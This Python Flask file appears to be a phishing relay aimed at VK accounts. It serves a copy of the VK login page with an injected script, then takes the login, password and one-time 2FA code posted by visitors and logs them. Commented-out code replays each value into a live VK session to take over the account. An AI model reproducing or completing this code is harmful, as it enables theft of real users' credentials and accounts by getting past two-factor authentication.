from flask import Flask, request
from webdriver.__webdriver__VK import __webdriver__VK
import time
import json
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)

HASH = hash(time.time())
# vk = __webdriver__VK(HASH)


@app.route('/')
def INDEX():
    # content = vk.content()
    # soup = BeautifulSoup(content, 'html.parser')
    # soup.head.script['src'] = 'static/main.js'
    # soup.find('div', class_='vkc__PromoBox__box').append(soup.new_tag('input', id='hash', value=HASH))
    # return str(soup)
    return ''

@app.route('/API', methods=['POST'])
def API():
    HASH = request.get_json()['HASH']

    print(request.get_json())



    # if request.get_json()['LOGIN'] != '':
    #     vk.inputKey('vkc__TextField__input', request.get_json()['LOGIN'])
    #     vk.buttonPresses('vkc__Button__primary')



    # if request.get_json()['_LOGIN_'] != '' and request.get_json()['_PASSWORD_'] == '':
    #     vk.inputKey('/html/body/div/div/div/div[2]/div/form/div[1]/section/div/div/div/input', request.get_json()['_LOGIN_'])
    #     vk.buttonPresses('vkc__Button__primary')

    # if request.get_json()['_PASSWORD_'] != '' and request.get_json()['_KEY_'] == '':
    #     vk.inputKey('/html/body/div/div/div/div[2]/div/form/div[1]/div[3]/div[2]/div[1]/div/input', request.get_json()['_PASSWORD_'])
    #     vk.buttonPresses('vkc__Button__fluid')

    # if request.get_json()['_KEY_'] != '':
    #     vk.inputKey('//*[@id="otp"]', request.get_json()['_KEY_'])
    #     vk.buttonPresses('vkc__Button__fluid')



    return '{}'

if __name__ == '__main__':
    app.run()